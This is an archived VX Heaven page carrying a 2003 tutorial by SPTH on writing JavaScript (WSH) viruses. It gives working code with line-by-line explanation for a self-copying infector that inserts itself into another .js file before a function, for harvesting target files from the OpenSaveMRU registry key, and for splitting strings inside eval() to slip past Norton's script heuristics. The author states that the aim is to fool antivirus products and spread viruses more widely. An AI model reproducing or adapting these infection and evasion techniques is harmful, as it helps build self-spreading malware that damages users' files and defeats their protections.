<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Useful things in JavaScript' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Useful things in JavaScript, code, vcode, virus, commands, files, touppercase, wscript, letter, vsearch, file, technique, victim, detect, line, registry"/>
<meta name="Description" content="After writing articles about Encryption and Polymorphism in JavaScript I also discovered some other things in JavaScript. But that techniques are to short to write more articles about it, so I desided to write one containing all the things I found out while discovering that language. So, here we are..."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"3d2dd06c26116b53e7273263b26fbfbd6c6c5e6e-1498757965-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Useful things in JavaScript</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em>http://spth.de.vu/</em><br/> <em>May 2003</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp00">Back to index</a>] [<a href="/lib/vsp00.html#disqus_thread">Comments</a>]<br/> 
<h2>intro words</h2>
<p> After writing articles about Encryption and Polymorphism in JavaScript I also discovered some other things in JavaScript. But that techniques are to short to write more articles about it, so I desided to write one containing all the things I found out while discovering that language. So, here we are...</p>
<h2>EPO or middle infection in JavaScript</h2>
<p> Entry-Point Obscuring is a neverseen technique in JavaScript, also it will be hard to detect the virus inside the file and it will be even harder to desinfect a file infected by an EPO JavaScript virus. But I think, that I have to explain the technique for everybody. I wanna show you a normal file and a file infect by an EPO virus:</p>
<pre class="source">
   <strong>Not infected sample:</strong>         <strong>Infected sample:</strong>

    _______________              _______________
   |               |            |               |
   |   commands    |            | Call to virus |
   |               |            |               |
   |   commands    |            |   commands    |
   |               |            |               |
   |   commands    |            |   commands    |
   |               |            |               |
   |   commands    |            |     Virus     |
   |_______________|            |               |
                                |   commands    |
                                |               |
                                |   commands    |
                                |_______________|</pre>
<p> OK, what to do? First we have to search any .JS file. Than we want to write the virus code to any line of the program. Sounds easy, but you forgot something: You can't write your code to any place of the file, because the real program would be killed. So, where to include the virus-code? A possible answere: Include your code before any 'function' in the code. If you do so, the orginal host-file won't be destruct. Another fact you have to think of is, thatyou have to search your virus-code in the file, and not to copy the whole file (=viruscode+host code) to the new victim. OK, now let's have a look at the example file.</p>
<h3>EPO-example</h3>
<pre class="source">
virus()

function virus()
{
  var fso=WScript.CreateObject("Scripting.FileSystemObject")
  var myfile=fso.OpenTextFile(WScript.ScriptFullName)
  var mycode=""; var line=String.fromCharCode(13)+String.fromCharCode(10)
  for (i=0; i&lt;500; i++)
  {
    code=myfile.ReadLine()
    if (code=="function virus()") 
    {
      for (j=1; j&lt;31; j++) { mycode+=code+line; code=myfile.ReadLine() }
      i=666;
    }
  }
  var vicall=fso.OpenTextFile("victim.js").ReadAll()
  var victim=fso.OpenTextFile("victim.js")
  var vcode=""; var viccodes=""; vsearch="FUNCTION";
  for (i=0; i&lt;vicall.length; i++)
  {
    vcode=victim.Read(1);
    if (vcode.toUpperCase()=="F") 
    { 
      for (j=1; j&lt;8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } 
    }
    if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }
    if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode }
  }
  virinc=fso.OpenTextFile("victim.js", 2).Write("virus()"+line+viccodes+line+mycode+line+"function"+victim.ReadAll())
  victim.Close();
}
</pre>
<p> I think, that you don't really understand the thing, because of that, I'll explain it. But first I want to tell you, what the program exactly does. First it opens itself, and searchs the start of itself ("function virus()"). Then it reads 31 lines of the code and save it (that's exactly the size of the virus). Then it opens a file named 'victim.js' (i was too lazy to make a real virus, but anyway: that's an EPO expanation and no 'how to write a JavaScript virus"-tutorial :D ). Now it searchs the a string with "function" (but uppercase, so it's no problem, if it's 'fuNcTioN'). If it finds this string, it writes in the file the code before the 'function', the viruscode, the whole code after the 'function' and of corse the call to the virus-function. But now let's look at the code-explanation...</p>
<h3>EPO-example-explanation</h3>
<pre class="source"><b> virus()</b>
	Guess what? That's t call to the virus-function. Without it, the file will be
	infect, but the virus will never run. Because of that I thought, it's better
	to include that line :D

<b> function virus()</b>
<b> {</b>
	That's our function. Here starts the virus-code.

<b> var fso=WScript.CreateObject("Scripting.FileSystemObject")</b>
<b> var myfile=fso.OpenTextFile(WScript.ScriptFullName)</b>
	'fso' is the FileSystemObject. Without that we won't be able to read or write
	anything to a file. That means, it's a very important opject. And myfile is the
	variable, which we opend our own file.

<b> var mycode=""; var line=String.fromCharCode(13)+String.fromCharCode(10)</b>
	We set some variables: 'mycode' will contain the viruscode at the end of the
	virus-run, and line contains chr(13)+chr(10). What's that, you may think?
	That's the same as the 'enter'-key ;)

<b> for (i=0; i&lt;500; i++)</b>
<b> {</b>
	Next things will run 500 times (not really, because the 'for' will stopp after
	the finish of reading from the victim-file.

<b> code=myfile.ReadLine()</b>
	Does what it sounds like: now code is one line of our own file. We need it,
	because we want to find our virus-code. (maybe now in the first generation, but
	for sure in the next ones)

<b> if (code=="function virus()") </b>
<b> {</b>
	If we found the first line of our code, let's do the next commands.

<b> for (j=1; j&lt;31; j++) { mycode+=code+line; code=myfile.ReadLine() }</b>
	The virus-code has 31 lines, because of that we have to read the 31st lines
	we find after the start. Than we have the viruscode.

<b> i=666;</b>
<b> }</b>
<b> }</b>
	This is a very ugly way to stopp a 'for', but my favorit one :). After that the
	'for' ends and than the 'if'.

<b> var vicall=fso.OpenTextFile("victim.js").ReadAll()</b>
	vicall=the whole code of the victim, that we want to infect. We need that because
	we want to know the size of the victim.

<b> var victim=fso.OpenTextFile("victim.js")</b>
	Now we open our victim again to read every letter for it's own., because we want wo
	find a function.

<b> var vcode=""; var viccodes=""; vsearch="FUNCTION";</b>
	That's three variables we need in our code. vcode be compain one byte every run of the
	next 'for', viccode will contain the whole code of the victim before the function starts,
	and vsearch contains the searchstring, that we need to compair with the string we found in
	our victim.

<b> for (i=0; i&lt;vicall.length; i++)</b>
<b> {</b>
	Next things will run as often as our victim is long.

<b> vcode=victim.Read(1);</b>
	We read one byte of the victimcode.

<b> if (vcode.toUpperCase()=="F") </b>
<b> { </b>
	If the uppercase of the letter we read is "F", we do the next things (maybe we found a 
	function?! yahuu :D )

<b> for (j=1; j&lt;8; j++) { vcode+=victim.Read(1); if (vcode.toUpperCase() !=vsearch.substring(0,j+1)) { j=666 }; i++; } </b>
	We read 8 more letters (F=1, U=2, N=3, ...). If that string we found is not the string we're
	searching for, we stopp to read more letters this time ('j=666'=close the for in my favorit way.
	Than we add 1 to i, otherwise there would be a 'Read After EOF'-Error.
<b> }</b>
	Close our important 'if'.

<b> if (vcode.toUpperCase()==vsearch) { i=vicall.lenght+666 }</b>
	now let's compair, if the whole string we read ('F'+7 other letters) is the thing we're
	searching for ('FUNCTION'). If yes, we stop to search functions, because we already found
	one... ;)

<b> if (vcode.toUpperCase()!=vsearch) { viccodes+=vcode }</b>
	If the things aren't the same, we copy the 8 letters to our start of the victim-code,
	because we'll need them in the end of the code.

<b> }</b>
	End of the "searching after functions"-'for'.

<b> virinc=fso.OpenTextFile("victim.js", 2).Write("virus()"+line+viccodes+line+mycode+line+"function"+victim.ReadAll())</b>
	We open the victim again to write into it (look at the '2'). Than we write into it a
	call to our virus-function ('virus()'). Then we'll add a blank-line, than the victim-code
	before the function, than again a blank-line, than our virus code, than once more a
	blank-line, than the string "function" (because we didn't add it to any variable), than
	the rest of the victim-code. Here we have it... our infect file ;)

<b> victim.Close();</b>
	Let's close te victim-file.
<b> }</b>
	And end of our virus function.
</pre>
<h2>.Searching for victims in the registry (Not for Win95|98|ME)</h2>
<p> At least every JavaScript virus (not worm!) searchs for files in the current directory and sometimes also in Windows-, System- or Temp-directorys. But I'm sure, that no user will execute a file in the system or temp-directory. Because of that I thought, I have to find an other way to find victim, and suddenly the Registry came to my mind. OK, now let's search files from registry. Now we have to know the key, where we can find the files.</p>
<p> And here is it:</p>
<h3>registry-key for JavaScript files</h3>
<pre class="source">
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\\MRUList
</pre>
<h3>registry-key list</h3>
<p> Now we have a list of some JavaScript-files. For instance that:</p>
<pre class="source">
(standart)	REG_SZ		(no value)
a		REG_SZ		C:\Windows\victim.js
b		REG_SZ		C:\Files\JavaScripts\work.js
c		REG_SZ		D:\Games\Race-Game\runme.js
d		REG_SZ		C:\My Shared Docs\flowers.js
MRUList		REG_SZ		dcab
</pre>
<p> Our list contains four files, but it's also possible, that there are ten samples. OK, but how do we know, how many files there are? We want to infect every of this files, but if we try to read a key, that doesn't exist, there will be an error. So what to do? Let's look at the 'MRUList'. It's value contains every key, which contains a file. What do do with it? We have to read the whole 'MRUList' value, than we read every key, which is in the 'MRUList'. Dadaaa... we have all files ;) Maybe you don't really understand, what I mean, because of that You will find an example.</p>
<h3>registry-key example</h3>
<pre class="source">
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var shell=WScript.CreateObject("WScript.Shell")
MRU="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\"
MRUList=shell.RegRead(MRU+"MRUList")
for (i=1; i&lt;=MRUList.length; i++)
{
  victim=shell.RegRead(MRU+MRUList.substring(i-1,i))
  if (fso.FileExists(victim))
  {
    WScript.Echo(victim)
  }
}
</pre>
<p> That example makes a MessageBox for every file, which is in that key, and that exists at the computer (because it's able, that there is a file-name in the registry and it doesn't exist at the computer anymore), because we don't want to have a "File not found" error. Now you'll find an exact explanation of the example.</p>
<h3>explanation of registry-key example</h3>
<pre class="source"><b> var fso=WScript.CreateObject("Scripting.FileSystemObject")</b>
<b> var shell=WScript.CreateObject("WScript.Shell")</b>
	This are two variables, which are used for reading from the registry (shell) and
	for checking if the file exists (fso).

<b> MRU="HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU\\js\"</b>
	The variable with the key for the registry. I wrote it to a variable, otherwise
	the program will be bigger, because I've to use this key two times.

<b> MRUList=shell.RegRead(MRU+"MRUList")</b>
	This variable is the content of the 'MRUList'. In our example it was 'dcba'.
	I'll use it to check, how many entries are in the key.

<b> for (i=1; i&lt;=MRUList.length; i++)</b>
<b> {</b>
	The next things will run as often, as long MRUList is (in our example 4 Bytes=
	4 times). I used this, because we know, as many letters are in MRUList, as many
	entrys are in the key.

<b> victim=shell.RegRead(MRU+MRUList.substring(i-1,i))</b>
	Variable 'victim' is one letter of the content from MRUList. For instands first run
	i=1: i-1,i: 1-1,1: 0,1: we read everything from letter zero to letter one (= the first
	letter in the content). :)

<b> if (fso.FileExists(victim))</b>
<b> {</b>
	Let's check, if the file already exist on the computer. If yes, we'll do the next
	things. If not, we won't do it. If the file exists, 'fso.FileExists(victim)' will
	return the value 1. And that's 'TRUE'. Else it will return the value 0 (='FALSE').
	I think, you got the point.

<b> WScript.Echo(victim)</b>
	After finding key, which contains the filename, finding the the filename and checking
	if the file exists, we're making a messagebox to write the filename. If you use this
	technique for a virus, you have to include your file-infection code here. But I thought,
	that i don't have to include a virus-body. :)
<b> }</b>
<b> }</b>
	The last part in the example is the end of the 'if', which checked, if the file exists
	and the end of the 'for', which run as often as much files exists.
</pre>
<h2>Encrypting commands</h2>
<p> While writing an article about JavaScript string encryption, I had no idea how to encrypt the commands, also they are as important as the strings. After reading some things about JavaScript, the idea came to my mind. And it's a very nice one. The princip after the whole idea is the command 'eval()'. The command run strings. :) Let's have a look at the command.</p>
<h3>'eval()' example</h3>
<pre class="source">
eval('WScript.Echo("Any silly message")')
</pre>
<p> You got the point? The only thing we have to do is to encrypt the command in the same was as a string, and set it to the command. This could be very important, because for instands Norton AV's Script-Checker Heuristic will detect a virus, which creates a simple file. Now let's look at a encrypt example. The example only generats a new file named 'eval.txt'. As you will see, this is only a little encrypt, but Norton Script Checker don't detect anything :)</p>
<h3>'eval()' encryption example</h3>
<pre class="source">
var ene="e"
var eni="i"
eval('WScr'+eni+'pt.Cr'+ene+'at'+ene+'Object("Scripting.FileSystemObject").Cr'+ene+'at'+ene+'T'+ene+'xtF'+eni+'l'+ene+'("eval.txt")')
</pre>
<h2>last words</h2>
<p> I think, that these techniques are very useful, if you want to make a JavaScript virus. And I'm sure, that AV's will have problems to desinfect a virus useing my EPO technique, of detect a virus, wich is 100% encrypt with the 'eval()' technique. And I'm sure, that spreading the virus ALSO (not only) with that registry technique will be much more successfull than don't use it. My goal is to fool AVs with techniques, which are hard to detect or desinfect. And I think, this time I was successful in doing that. :)</p>
<pre>
							- - - - - - - - - - - - - - -
							  Second Part To Hell/[rRlf]  
							  www.spth.de.vu
							  <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96e5e6e2fed6f7f9f8fbf7fffab8f7e2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
							  written in may 2003
							  Austria
							- - - - - - - - - - - - - - -</pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp00">Back to index</a>] [<a href="/lib/vsp00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp00">de</a><a href="/lib/index.php?lang=en&amp;id=vsp00">en</a><a href="/lib/index.php?lang=es&amp;id=vsp00">es</a><a href="/lib/index.php?lang=it&amp;id=vsp00">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp00">ua</a></div>
</body>
</html>
